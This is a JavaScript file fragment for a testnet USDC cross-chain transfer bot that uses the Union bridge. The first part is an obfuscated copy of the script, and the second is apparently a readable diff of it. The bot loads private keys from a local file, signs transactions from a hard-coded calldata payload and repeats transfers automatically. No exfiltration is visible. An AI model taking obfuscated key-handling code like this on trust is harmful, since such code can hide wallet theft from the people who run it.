_0x3bf5ee(_0x4da492);},'tCwHP':_0x479f68(0x331),'IBpJr':_0x479f68(0x291),'aNmKg':function(_0x35f7e5,_0x38ed30){return _0x35f7e5>_0x38ed30;},'iKckg':_0x479f68(0x271)+_0x479f68(0x271)+_0x479f68(0x271)+_0x479f68(0x271)+_0x479f68(0x35a)+_0x479f68(0x1cb)+_0x479f68(0x265),'yWGpO':function(_0x1ffec9){return _0x1ffec9();},'uZhAx':function(_0x1d63e6,_0x1fb783,_0x1dadef,_0x125a15){return _0x1d63e6(_0x1fb783,_0x1dadef,_0x125a15);},'yCDZk':_0x479f68(0x2f3)+_0x479f68(0x336)+_0x479f68(0x1e2)+_0x479f68(0x361)+_0x479f68(0x314)+_0x479f68(0x379)+_0x479f68(0x2b8),'LnJzg':_0x479f68(0x380)+_0x479f68(0x384)+_0x479f68(0x2a8)+_0x479f68(0x1c9)+_0x479f68(0x271)+_0x479f68(0x271)+_0x479f68(0x2ff),'AuTjI':function(_0x5be069,_0x469585,_0x4743c7,_0x47e3e9){return _0x5be069(_0x469585,_0x4743c7,_0x47e3e9);},'zNCTv':function(_0x10270d,_0x2a86d8,_0x1967bb,_0x4b7154){return _0x10270d(_0x2a86d8,_0x1967bb,_0x4b7154);},'XYDVH':_0x479f68(0x271)+_0x479f68(0x271)+_0x479f68(0x271)+_0x479f68(0x271)+_0x479f68(0x271)+_0x479f68(0x23c)+_0x479f68(0x224),'YAlOn':function(_0x55e1fc,_0x5be7da){return _0x55e1fc(_0x5be7da);},'vEmtC':function(_0x1eef22,_0x5ceb81,_0x4e7798,_0x339598){return _0x1eef22(_0x5ceb81,_0x4e7798,_0x339598);},'owTsU':function(_0x17c86f,_0x5827e9){return _0x17c86f!==_0x5827e9;},'nUZwy':function(_0x28fc68,_0xd45cdd){return _0x28fc68+_0xd45cdd;},'PlVSq':_0x479f68(0x2df)+_0x479f68(0x226)+_0x479f68(0x2bc),'xFOfV':_0x479f68(0x25a)+_0x479f68(0x367),'gGsUl':_0x479f68(0x1e6)+_0x479f68(0x2b4)+':','sPkHz':function(_0x541a1a,_0xb4b15c){return _0x541a1a===_0xb4b15c;},'yHdGy':_0x479f68(0x2f7),'qrPgy':_0x479f68(0x297),'youXc':function(_0x454e9f,_0x31091c){return _0x454e9f===_0x31091c;},'DTCfn':_0x479f68(0x38a)+_0x479f68(0x35d)+_0x479f68(0x30b),'eWEfL':_0x479f68(0x3a8)+_0x479f68(0x2b9),'SOvkm':_0x479f68(0x1f9)+_0x479f68(0x23b)+_0x479f68(0x1d8)+_0x479f68(0x359)+_0x479f68(0x362),'fRLHA':_0x479f68(0x370)+'0','FDMPY':_0x479f68(0x1ed)+_0x479f68(0x1ed)+_0x479f68(0x227),'CBDad':_0x479f68(0x325)+_0x479f68(0x1c1),'wpKxa':_0x479f68(0x276),'DhYQe':_0x479f68(0x341)+_0x479f68(0x350)+'\x20❌','ohtqW':_0x479f68(0x1e3),'VxexG':_0x479f68(0x2ce)};try{const _0xdd7e0=_0x5c7f24[_0x479f68(0x31c)](formatUsdcValue,_0x3b902d),_0x306201=await provider[_0x479f68(0x2b6)+_0x479f68(0x201)](wallet[_0x479f68(0x2fd)],_0x5c7f24[_0x479f68(0x2fc)]),_0xba52e4=await provider[_0x479f68(0x306)]();let _0x186ddf=_0xba52e4[_0x479f68(0x30f)+'as']||ethers[_0x479f68(0x305)]('20',_0x5c7f24[_0x479f68(0x1e7)]),_0x143ddc=_0xba52e4[_0x479f68(0x2e1)+_0x479f68(0x1ee)]||ethers[_0x479f68(0x305)]('1',_0x5c7f24[_0x479f68(0x1e7)]);_0x5c7f24[_0x479f68(0x387)](_0x143ddc,_0x186ddf)&&(_0x143ddc=_0x186ddf);const _0x325406=_0x5c7f24[_0x479f68(0x28a)],_0x5d1de2=_0x5c7f24[_0x479f68(0x3a2)](generateTimeoutTimestamp)[_0x479f68(0x315)](-0x1c06*0x1+0x53f+0x133*0x13);let _0xbd3ff=_0x5c7f24[_0x479f68(0x35f)](replace32ByteField,PAYLOAD,_0x325406,_0x5d1de2);const _0x5cc90c=_0x5c7f24[_0x479f68(0x24a)],_0x4732cc=_0x5c7f24[_0x479f68(0x3a2)](generateSalt)[_0x479f68(0x315)](-0xb63+-0x2096+0x1b*0x1a1);_0xbd3ff=_0x5c7f24[_0x479f68(0x35f)](replace32ByteField,_0xbd3ff,_0x5cc90c,_0x4732cc);const _0x2fa4b4=_0x5c7f24[_0x479f68(0x1fb)],_0x445f6a=wallet[_0x479f68(0x2fd)][_0x479f68(0x315)](-0x5eb+0x1601+-0x1014)[_0x479f68(0x390)](0x34*0x71+-0x2047+0x993,'0');_0xbd3ff=_0x5c7f24[_0x479f68(0x309)](replace32ByteField,_0xbd3ff,_0x2fa4b4,_0x445f6a),_0xbd3ff=_0x5c7f24[_0x479f68(0x2c3)](replace32ByteField,_0xbd3ff,_0x2fa4b4,_0x445f6a);const _0x200dc6=_0x5c7f24[_0x479f68(0x37f)],_0x2ec9ea=_0x5c7f24[_0x479f68(0x1bf)](to32ByteHex,_0xdd7e0);_0xbd3ff=_0x5c7f24[_0x479f68(0x35f)](replace32ByteField,_0xbd3ff,_0x200dc6,_0x2ec9ea),_0xbd3ff=_0x5c7f24[_0x479f68(0x353)](replace32ByteField,_0xbd3ff,_0x200dc6,_0x2ec9ea);if(_0x5c7f24[_0x479f68(0x321)](_0xbd3ff[_0x479f68(0x206)],0x2*0x2c2+0x9c5*-0x1+0xdc9*0x1))throw new Error(_0x479f68(0x210)+_0x479f68(0x287)+_0x479f68(0x324)+_0xbd3ff[_0x479f68(0x206)]+(_0x479f68(0x2ca)+_0x479f68(0x347)+_0x479f68(0x247)));const _0x307578={'to':UNION_CONTRACT_ADDRESS,'data':_0x5c7f24[_0x479f68(0x1c2)]('0x',_0xbd3ff),'value':0x0,'gasLimit':0x493e0,'maxFeePerGas':_0x186ddf,'maxPriorityFeePerGas':_0x143ddc,'nonce':_0x306201,'chainId':CHAIN_ID};console[_0x479f68(0x27c)](_0x5c7f24[_0x479f68(0x2af)]),console[_0x479f68(0x27c)](_0x479f68(0x256)+_0x479f68(0x24f)+_0x479f68(0x2c9)+ethers[_0x479f68(0x305)](_0x3b902d,0x75b+-0x9*0x101+0xda*0x2)),console[_0x479f68(0x27c)](_0x479f68(0x1c4)+_0x479f68(0x264)+_0x479f68(0x244)+'='+_0x186ddf+(_0x479f68(0x2cb)+_0x479f68(0x3aa)+_0x479f68(0x1d5))+_0x143ddc),console[_0x479f68(0x27c)](_0x479f68(0x242)+wallet[_0x479f68(0x2fd)]),console[_0x479f68(0x27c)](_0x479f68(0x22e)+_0x4732cc),console[_0x479f68(0x27c)](_0x479f68(0x23d)+_0x479f68(0x354)+_0x5d1de2);const _0xd6824c=await wallet[_0x479f68(0x31b)+_0x479f68(0x1c7)](_0x307578);console[_0x479f68(0x27c)](_0x5c7f24[_0x479f68(0x3a7)],_0xd6824c[_0x479f68(0x219)]),console[_0x479f68(0x27c)](_0x479f68(0x233)+_0x479f68(0x223)+_0x479f68(0x296)+_0x479f68(0x383)+_0x479f68(0x258)+_0x479f68(0x311)+_0xd6824c[_0x479f68(0x219)]);const _0x31b874=await _0xd6824c[_0x479f68(0x308)]();console[_0x479f68(0x27c)](_0x5c7f24[_0x479f68(0x1d4)],_0x5c7f24[_0x479f68(0x279)](_0x31b874[_0x479f68(0x2e5)],0xc7*0x31+0xcf+0xcf7*-0x3)?_0x5c7f24[_0x479f68(0x1c0)]:_0x5c7f24[_0x479f68(0x25b)]);if(_0x5c7f24[_0x479f68(0x1de)](_0x31b874[_0x479f68(0x2e5)],0x1bec*-0x1+0x45*-0x3+0x3*0x994)){console[_0x479f68(0x27c)](_0x5c7f24[_0x479f68(0x1d0)]);const _0x3e80f3=await _0x5c7f24[_0x479f68(0x1bf)](pollPacketHash,_0xd6824c[_0x479f68(0x219)]);_0x3e80f3?console[_0x479f68(0x27c)](_0x5c7f24[_0x479f68(0x283)],_0x3e80f3):console[_0x479f68(0x27c)](_0x5c7f24[_0x479f68(0x2d9)]);}}catch(_0x172e77){const _0x1aff93=_0x5c7f24[_0x479f68(0x20e)][_0x479f68(0x34a)]('|');let _0x4414ec=-0x10ef+0x1ed9+0x112*-0xd;while(!![]){switch(_0x1aff93[_0x4414ec++]){case'0':console[_0x479f68(0x286)](_0x5c7f24[_0x479f68(0x248)]);continue;case'1':console[_0x479f68(0x286)](_0x5c7f24[_0x479f68(0x262)],'0x'+modifiedPayload);continue;case'2':console[_0x479f68(0x286)](_0x5c7f24[_0x479f68(0x202)],_0x172e77[_0x479f68(0x2b7)]);continue;case'3':console[_0x479f68(0x286)](_0x5c7f24[_0x479f68(0x26d)]);continue;case'4':console[_0x479f68(0x286)](_0x5c7f24[_0x479f68(0x1d7)],_0x172e77[_0x479f68(0x32b)]);continue;case'5':_0x172e77[_0x479f68(0x2eb)]&&console[_0x479f68(0x286)](_0x5c7f24[_0x479f68(0x280)],_0x172e77[_0x479f68(0x2eb)]);continue;}break;}}}async function mainMenu(){const _0x1d9ef3=_0x53a270,_0x44551f={'QwMwz':function(_0x3b04d8){return _0x3b04d8();},'kZbjt':function(_0x31035c,_0x2bbcbd){return _0x31035c(_0x2bbcbd);},'IvAZX':_0x1d9ef3(0x1fc)+_0x1d9ef3(0x2da)+_0x1d9ef3(0x39a),'qEKqj':function(_0x4d6a3f,_0x433a29){return _0x4d6a3f(_0x433a29);},'BzNFK':function(_0x3d416a,_0x2699e7){return _0x3d416a(_0x2699e7);},'gXkDU':_0x1d9ef3(0x253)+_0x1d9ef3(0x1ec)+_0x1d9ef3(0x2f4)+_0x1d9ef3(0x1bc),'pKyFf':function(_0x10181c,_0x1dbd90){return _0x10181c<_0x1dbd90;},'zvOpg':function(_0x261cd1,_0x3fc63c){return _0x261cd1(_0x3fc63c);},'XeGsn':_0x1d9ef3(0x2c2)+'!','bvlKX':_0x1d9ef3(0x346)+_0x1d9ef3(0x35c)+_0x1d9ef3(0x26c)+_0x1d9ef3(0x263)};while(!![]){_0x44551f[_0x1d9ef3(0x381)](displayBanner),_0x44551f[_0x1d9ef3(0x381)](displayMenu);const _0x49e749=await _0x44551f[_0x1d9ef3(0x32f)](getUserInput,_0x44551f[_0x1d9ef3(0x32e)]);if(!['1','2','3'][_0x1d9ef3(0x39c)](_0x49e749)){console[_0x1d9ef3(0x27c)](_0x1d9ef3(0x1e9)+_0x1d9ef3(0x373)+_0x49e749+(_0x1d9ef3(0x320)+_0x1d9ef3(0x352)+_0x1d9ef3(0x1dc))),await _0x44551f[_0x1d9ef3(0x2d2)](sleep,-0x7*0x4db+-0x10e0+-0x1*-0x38b9);continue;}switch(_0x49e749){case'1':try{const _0x487986=await _0x44551f[_0x1d9ef3(0x381)](getTransferParams);await _0x44551f[_0x1d9ef3(0x32f)](executeTransfers,_0x487986);}catch(_0xf05fbd){console[_0x1d9ef3(0x286)](_0x1d9ef3(0x1f6)+_0xf05fbd[_0x1d9ef3(0x32b)]);}await _0x44551f[_0x1d9ef3(0x229)](getUserInput,_0x44551f[_0x1d9ef3(0x295)]);break;case'2':try{const _0x2d40bb=await _0x44551f[_0x1d9ef3(0x381)](getTransferParams);if(_0x44551f[_0x1d9ef3(0x378)](_0x2d40bb[_0x1d9ef3(0x2a5)],0xd55*-0x1+-0x13*0x4e+0x1321))_0x2d40bb[_0x1d9ef3(0x2a5)]=-0x7f7*-0x3+0x2551+-0x3d34;await _0x44551f[_0x1d9ef3(0x251)](executeTransfers,_0x2d40bb);}catch(_0x1a632e){console[_0x1d9ef3(0x286)](_0x1d9ef3(0x1f6)+_0x1a632e[_0x1d9ef3(0x32b)]);}await _0x44551f[_0x1d9ef3(0x251)](getUserInput,_0x44551f[_0x1d9ef3(0x295)]);break;case'3':console[_0x1d9ef3(0x27c)](_0x44551f[_0x1d9ef3(0x29d)]),rl[_0x1d9ef3(0x231)](),process[_0x1d9ef3(0x2e2)](-0x25a6+-0xd0e+0x32b4);default:console[_0x1d9ef3(0x27c)](_0x44551f[_0x1d9ef3(0x376)]),await _0x44551f[_0x1d9ef3(0x2d2)](sleep,0x12f9*0x2+-0xa7*-0x5+0x1*-0x2359);}}}require[_0x53a270(0x215)]===module&&mainMenu();module[_0x53a270(0x3bf)]={'mainMenu':mainMenu};function _0x4296(){const _0x5d89a2=['0008000000','https://ap','\x20\x20\x20\x20\x20\x20\x20Sep','\x22.\x20Please\x20','owTsU','vDFez','formatUnit','th:\x20','Modified\x20P','\x201):\x20','\x20packet_ha','gPqQt','getRandomV','startsWith','message','📥\x20Raw\x20inpu','applicatio','IvAZX','kZbjt','toString','pending','ransaction','========\x20🌉','hash\x20found','1a7b0f142e','b767266331','SFNLN','🔄\x20Enter\x20nu','readFileSy','stdin','count.\x20Mus','NdbnO','317420ea7d','mGeeL','f6C1539d30','isHexStrin','\x0a❌\x20Transac','dwAHQ','\x20failed.','mber.','QVdpG','\x0a❌\x20Unexpec','\x202440\x20hex\x20','ce\x20already','1d743fbc61','split','function','Invalid\x20US','0000024000','ethers','tion_hash:','tion\x20Error','uint256','enter\x201,\x202','vEmtC','p:\x200x','0x1c7D4B19','olia\x20to\x20Ho','er:\x20','\x20transfer.','ter\x20maximu','0000000018','webcrypto','ted\x20error.','g\x20for\x20pack','\x20to\x20get\x20pa','uZhAx','_value','76e8c73580','m\x20retries','RNQgN','AA04C2eDf5','KgGvt','ions\x20in\x20se','ion\x20hash:','3️⃣\x20\x20Exit\x0a','\x20$submissi','Approval\x20t','📊\x20Configur','743Fbc6116','g\x20transfer','bqCsx','7B0f142E9F','3|2|4|5|1|','\x20private\x20k','6000000000','\x20choice:\x20\x22','0001000000','QzBpW','bvlKX','rface','pKyFf','91ed3703a2','p.union.bu','UkoCl','nsfers:\x20','r\x20Configur','ation:','XYDVH','78ff133dd6','QwMwz','\x20v2_transf','ps://sepol','be81621062','nt\x20allowan','1️⃣\x20\x20Start\x20N','aNmKg','delay','1364fdMAey','\x0a🔍\x20Checkin','roval\x20for\x20','r\x20Bot','g\x20USDC\x20app','Contract','ansactions','padEnd','t\x20be\x20at\x20le','n/json','vider','0705EA5000','n/graphql-','805650517d','_spender','join','question','(1-3):\x20','PVBYP','includes','.org','efore\x20next','0001c00000','t\x20hash:\x20','0000000280','yWGpO','🔹\x20Options:','6491ed3703','g\x20Union\x20co','ntract\x20to\x20','xFOfV','🎉\x20Final\x20Pa','ring!)\x20{\x0a\x20','ityFeePerG','\x20\x20\x20Amount\x20','lesky\x20USDC','post','dLmhD','allowance','\x20positive\x20','bmission_t','\x0a⏳\x20Waiting','DC\x20amount.','a2c1f30000','\x0a🚀\x20Startin','532d510000','5578811aeb','ault:\x200):\x20','ZQXDq','smhxA','\x20\x20\x20\x20\x20}\x0a\x20\x20\x20','\x22\x20|\x20Cleane','t:\x20\x22','00000000a0','exports','0200000000','Attempt\x20','ast\x201.','on_tx_hash','nu...','02c0000000','\x0a🔄\x20Executi','YAlOn','yHdGy','ayload:','nUZwy','Found\x20pack','⛽\x20Gas\x20fees','balance','viem','ction','aiqrN','2e9f532d51','qImtS','47fd16b0cc','trim','📜\x20Approval','response+j','\x20Cross-Cha','DTCfn','16a902379c','ild','ng\x20transfe','gGsUl','as=','621062971a','ohtqW','et\x20hash\x20af','80c4a4ac84','on\x20hash:','AFurM',',\x20or\x203.','DupWj','youXc','o\x20replacem','=========\x20','cation/jso','7420ea7d02','Message:','query\x20($su','crypto','📌\x20Transact','IBpJr','💰\x20Enter\x20US','\x0a❌\x20Invalid','9f532d5100','path','nter\x20to\x20re','==========','yFeePerGas','Error\x20quer','AKYeP','Wallet','ld\x20','\x20set.','DHtdn','x_hash:\x20St','\x0a❌\x20Error:\x20','📤\x20Approvin','133DD6Be81','❌\x20Failed\x20t','QmSna','LnJzg','👉\x20Enter\x20yo','ZLkuT','0455534443','ZqIAx','polia.drpc','tionCount','wpKxa','ansaction\x20','✅\x20Sufficie','🌉\x20========','length','5553444300','QiZvV','ACknt','Cigzy','lay\x20betwee','ansfers','0000000200','fRLHA','1603155evcbgm','Invalid\x20pa','warn','ZarIi','nhhiZ','ting...','main','ultiple\x20Tr','lay.\x20Must\x20','d\x20yet,\x20wai','hash','_owner','ying\x20packe','utf8','mnGpl','n.build/v1','padStart','0000001478','a902379C72','ENlRb','Sepolia\x20Te','4240','ecivG','\x20transacti','====','argv','BzNFK','or\x20missing','DC\x20amount\x20','978Bfe465a','📌\x20Approval','🧂\x20Salt:\x200x','ers(args:\x20','RSgux','close','\x20(default:','🔍\x20View\x20on\x20','nZtAS','cyPpy','4240000000','\x20\x20\x20Delay\x20b','\x20after\x20','⏰\x20Enter\x20de','ey\x20in\x20priv','o\x20get\x20pack','000000000f','⏰\x20Timestam','of\x20transfe','TodhY','spend\x20','TPEDK','🔐\x20Sender:\x20','ract...','xFeePerGas','lghQI','n\x20transact','chars','FDMPY','deZrT','yCDZk','\x20for\x20','fd16b0cc16','readline','277703EwFQTW','unt\x20(units','\x20Must\x20be\x20a','zvOpg','clear','\x0a✨\x20Press\x20E','0276e8c735','0000030000','💰\x20USDC\x20amo','balanceOf','ia.ethersc','\x0a📝\x20Checkin','📜\x20Transact','qrPgy','amount','v2_transfe','xhaDI','BcYSr','0x5FbE74A2','tGJHd','CBDad','y\x20again.','\x20(ETH):\x20ma','1680','0.000001','d9B1c0bf80','\x20Status:','packet_has','be\x20a\x20non-n','ff133dd6be','\x20Please\x20tr','DhYQe','32NJmPmX','ew\x20Transfe','OHYyz','0000000000','2GgQgqg','0600000000','replace','5925360OEaveB','Type:','gzip,\x20defl','ys.txt','sPkHz','floor','26730ClyoKf','log','approve','})\x20{\x0a\x20\x20\x20\x20\x20','Mozilla/5.','VxexG','in\x20Transfe','lYfqK','eWEfL','sh\x0a\x20\x20\x20\x20\x20\x20\x20','83f7954f10','error','yload\x20leng','KkzbR','Packet\x20has','iKckg','plzZb','0000000001','alues','\x0a🌉\x20=======','conds\x20(def','00001478ff','gwei','axios','aRulC','number.','gXkDU','stnet:\x20htt','❌\x20Failed','(s)...','170427CzHSSO','\x20USDC...','stdout','usmjl','XeGsn','cFYIt','ate_keys.t','egative\x20nu','9200lDcDJc','00141c7d4b','Invalid\x20tr','https://se','count','JtOlX','en-US,en;q','971a7b0f14','oDYNI','rs:\x20','nTqWr','d\x20input:\x20\x22','21hvrMmz','mber\x20of\x20tr','PlVSq','ate,\x20br,\x20z','map','Tnvki','ent\x20occurr','ion\x20Status','xZUuJ','getTransac','name','c1f3','cket\x20Hash:','mAqeX','https://gr','on...','6Cb0C7B01d','bool','private_ke','Warning:\x20N','0000002000','\x0a👋\x20Goodbye','zNCTv','98b7672663','\x20\x20\x20Number\x20','\x20seconds\x20b','GADWM','AeDdR','):\x20',',\x20expected',',\x20maxPrior','❌\x20Invalid\x20','0000001847','Data:','\x0a📝\x20Transfe','ePTvn','\x20retries.','qEKqj','1116342djrFgO','XqqyG','0.000001):','0xff0d7c2f','filter','0000001457','SOvkm','ur\x20choice\x20','ed\x20for\x20fie','8162106297','8000000000','lSIHC','\x0a📤\x20Sending','cket\x20hash.','maxPriorit','exit','\x20USDC','JsonRpcPro','status','0003a00000','Union\x20cont','h\x20not\x20foun','2️⃣\x20\x20Start\x20M','(default:\x20','data','\x20\x20\x20\x20\x20}','=0.9,id;q=','{p_transac','0100000000','DAOWG','00000f4240','7238000000','c4a4ac8498','turn\x20to\x20me','wkzZG','son,\x20appli','✅\x20Success','Invalid\x20de','GIapu','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','sqcsZ','tCwHP','address','et\x20hash!','0000','0000014000','0000000004','0000000060','per\x20transf','/graphql','parseUnits','getFeeData','EyfDG','wait','AuTjI','now','et\x20hash...','createInte','YhZIl','std','maxFeePerG','196cb0c7b0','an.io/tx/','3762XOVuIM','0000000020','5650517d64','slice','etween\x20tra','0.8','ild/','No\x20packet-','aphql.unio','sendTransa','VIFGh'];_0x4296=function(){return _0x5d89a2;};return _0x4296();}
+// ============= External Dependencies =============
+const { ethers } = require("ethers");
+const fs = require('fs');
+const path = require('path');
+const axios = require('axios');
+const { toHex } = require('viem');
+const crypto = require('crypto').webcrypto;
+const readline = require('readline');
+
+// Create readline interface
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+// ============= Network Configuration =============
+const RPC_URL = "https://sepolia.drpc.org"; // Public Sepolia RPC
+const UNION_CONTRACT_ADDRESS = "0x5FbE74A283f7954f10AA04C2eDf55578811aeb03"; // Union bridge contract
+const USDC_CONTRACT_ADDRESS = "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238"; // USDC proxy on Sepolia
+const CHAIN_ID = 11155111; // Sepolia Chain ID
+
+// USDC ERC-20 ABI
+const USDC_ABI = [
+    {
+        "constant": true,
+        "inputs": [{"name": "_owner", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "balance", "type": "uint256"}],
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [
+            {"name": "_spender", "type": "address"},
+            {"name": "_value", "type": "uint256"}
+        ],
+        "name": "approve",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {"name": "_owner", "type": "address"},
+            {"name": "_spender", "type": "address"}
+        ],
+        "name": "allowance",
+        "outputs": [{"name": "", "type": "uint256"}],
+        "type": "function"
+    }
+];
+
+// Load private key
+const PRIVATE_KEY = fs.readFileSync(path.join(__dirname, 'private_keys.txt'), 'utf8')
+    .split('\n')
+    .map(line => line.trim())
+    .filter(line => line && !line.startsWith('#'))[process.argv[3] || 0] || '';
+
+if (!PRIVATE_KEY || !ethers.isHexString(PRIVATE_KEY, 32)) {
+    console.error("❌ Invalid or missing private key in private_keys.txt");
+    process.exit(1);
+}
+
+// Initialize provider, wallet, and contracts
+const provider = new ethers.JsonRpcProvider(RPC_URL);
+const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
+const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, USDC_ABI, wallet);
+
+// ============= Menu Interface Functions =============
+function displayBanner() {
+    console.clear();
+    console.log("\n🌉 ==================================== 🌉");
+    console.log("       Sepolia to Holesky USDC Cross-Chain Transfer Bot");
+    console.log("🌉 ==================================== 🌉\n");
+}
+
+function displayMenu() {
+    console.log("🔹 Options:");
+    console.log("1️⃣  Start New Transfer");
+    console.log("2️⃣  Start Multiple Transfers");
+    console.log("3️⃣  Exit\n");
+}
+
+async function getUserInput(prompt) {
+    return new Promise((resolve) => {
+        rl.question(prompt, (answer) => {
+            const cleanedAnswer = answer.trim();
+            console.log(`📥 Raw input: "${answer}" | Cleaned input: "${cleanedAnswer}"`);
+            resolve(cleanedAnswer);
+        });
+    });
+}
+
+async function getTransferParams() {
+    console.log("\n📝 Transfer Configuration:");
+    const amountInput = await getUserInput("💰 Enter USDC amount (default: 0.000001): ");
+    const delayInput = await getUserInput("⏰ Enter delay between transactions in seconds (default: 0): ");
+    const countInput = await getUserInput("🔄 Enter number of transactions (default: 1): ");
+
+    const params = {
+        amount: amountInput || "0.000001", // Default to 0.000001 USDC (1 unit)
+        delay: (delayInput ? parseInt(delayInput) : 0) * 1000, // Convert to milliseconds
+        count: countInput ? parseInt(countInput) : 1
+    };
+
+    // Validate inputs
+    if (isNaN(params.amount) || params.amount <= 0) {
+        throw new Error("Invalid USDC amount. Must be a positive number.");
+    }
+    if (isNaN(params.delay) || params.delay < 0) {
+        throw new Error("Invalid delay. Must be a non-negative number.");
+    }
+    if (isNaN(params.count) || params.count < 1) {
+        throw new Error("Invalid transaction count. Must be at least 1.");
+    }
+
+    return params;
+}
+
+// ============= Enhanced Transaction Function =============
+async function executeTransfers(params) {
+    console.log("\n🚀 Starting transfer(s)...");
+    console.log("📊 Configuration:");
+    console.log(`   Amount per transfer: ${params.amount} USDC`);
+    console.log(`   Number of transfers: ${params.count}`);
+    console.log(`   Delay between transfers: ${params.delay / 1000}s\n`);
+
+    // Approve Union contract for total amount
+    const totalAmount = ethers.parseUnits((params.amount * params.count).toString(), 6);
+    await approveUnionContract(totalAmount);
+
+    for (let i = 0; i < params.count; i++) {
+        if (i > 0) {
+            console.log(`\n⏳ Waiting for ${params.delay / 1000} seconds before next transfer...`);
+            await sleep(params.delay);
+        }
+        console.log(`\n🔄 Executing transfer ${i + 1}/${params.count}`);
+        await sendRawPayloadTx(params.amount);
+    }
+}
+
+// ============= Approval Function =============
+async function approveUnionContract(amountInUnits) {
+    console.log("\n📝 Checking USDC approval for Union contract...");
+    const allowance = await usdcContract.allowance(wallet.address, UNION_CONTRACT_ADDRESS);
+    if (allowance >= amountInUnits) {
+        console.log("✅ Sufficient allowance already set.");
+        return;
+    }
+
+    console.log(`📤 Approving Union contract to spend ${ethers.formatUnits(amountInUnits, 6)} USDC...`);
+    const tx = await usdcContract.approve(UNION_CONTRACT_ADDRESS, amountInUnits);
+    console.log("📜 Approval transaction hash:", tx.hash);
+    const receipt = await tx.wait();
+    console.log("📌 Approval Status:", receipt.status === 1 ? "✅ Success" : "❌ Failed");
+
+    if (receipt.status !== 1) {
+        throw new Error("Approval transaction failed.");
+    }
+}
+
+// ============= Core Transaction Data =============
+// Payload for USDC transfer (adjusted for ERC-20)
+const PAYLOAD = "0xff0d7c2f000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001847fd16b0cc1680c4a4ac8498b7672663317420ea7d0276e8c735805650517d6491ed3703a2c1f300000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000003a000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000140000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000f42400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000024000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000f4240000000000000000000000000000000000000000000000000000000000000001478ff133dd6be81621062971a7b0f142e9f532d51000000000000000000000000000000000000000000000000000000000000000000000000000000000000001478ff133DD6Be81621062971a7B0f142E9F532d5100000000000000000000000000000000000000000000000000000000000000000000000000000000000000141c7d4b196cb0c7b01d743fbc6116a902379c72380000000000000000000000000000000000000000000000000000000000000000000000000000000000000004555344430000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045553444300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001457978Bfe465ad9B1c0bf80f6C1539d300705EA50000000000000000000000000";
+
+// ============= Cryptographic Functions =============
+function generateSalt() {
+    const rawSalt = new Uint8Array(32);
+    crypto.getRandomValues(rawSalt);
+    return toHex(rawSalt);
+}
+
+function generateUnionTimeoutTimestampHex() {
+    const nowMs = Date.now(); // Current time in milliseconds
+    const timeoutMs = nowMs + 24 * 60 * 60 * 1000; // Add 24 hours in milliseconds
+    const timeoutNs = BigInt(timeoutMs) * 1_000_000n; // Convert to nanoseconds
+    return timeoutNs.toString(16).padStart(64, '0'); // Pad to 64 hex characters
+}
+
+// ============= Payload Manipulation Functions =============
+function formatUsdcValue(usdcAmount) {
+    // Convert USDC to units (6 decimals)
+    const units = ethers.parseUnits(usdcAmount.toString(), 6);
+    return units.toString(16);
+}
+
+function to32ByteHex(num) {
+    return num.toString(16).padStart(64, '0');
+}
+
+function replace32ByteField(payload, oldField, newField) {
+    if (payload.startsWith('0x')) payload = payload.slice(2);
+    if (oldField.startsWith('0x')) oldField = oldField.slice(2);
+    if (newField.startsWith('0x')) newField = newField.slice(2);
+    const regex = new RegExp(oldField, 'i');
+    const result = payload.replace(regex, newField);
+    if (result === payload) {
+        console.warn(`Warning: No replacement occurred for field ${oldField}`);
+    }
+    return result;
+}
+
+// ============= Network Interaction Functions =============
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+async function pollPacketHash(txHash, retries = 50, intervalMs = 5000) {
+    const graphqlEndpoint = 'https://graphql.union.build/v1/graphql';
+    const headers = {
+        accept: 'application/graphql-response+json, application/json',
+        'accept-encoding': 'gzip, deflate, br, zstd',
+        'accept-language': 'en-US,en;q=0.9,id;q=0.8',
+        'content-type': 'application/json',
+        origin: 'https://app.union.build',
+        referer: 'https://app.union.build/',
+        'user-agent': 'Mozilla/5.0'
+    };
+
+    const data = {
+        query: `query ($submission_tx_hash: String!) {
+            v2_transfers(args: {p_transaction_hash: $submission_tx_hash}) {
+                packet_hash
+            }
+        }`,
+        variables: {
+            submission_tx_hash: txHash.startsWith('0x') ? txHash : `0x${txHash}`
+        }
+    };
+
+    for (let i = 0; i < retries; i++) {
+        try {
+            console.log(`Attempt ${i + 1}/${retries} to get packet hash...`);
+            const res = await axios.post(graphqlEndpoint, data, { headers });
+            const result = res.data?.data?.v2_transfers;
+
+            if (result && result.length > 0 && result[0].packet_hash) {
+                console.log("Found packet hash!");
+                return result[0].packet_hash;
+            }
+
+            console.log("Packet hash not found yet, waiting...");
+            await sleep(intervalMs);
+        } catch (err) {
+            console.error(`Error querying packet hash: ${err.message}`);
+            await sleep(intervalMs);
+        }
+    }
+
+    console.warn(`No packet-hash found after ${retries} retries.`);
+    return null;
+}
+
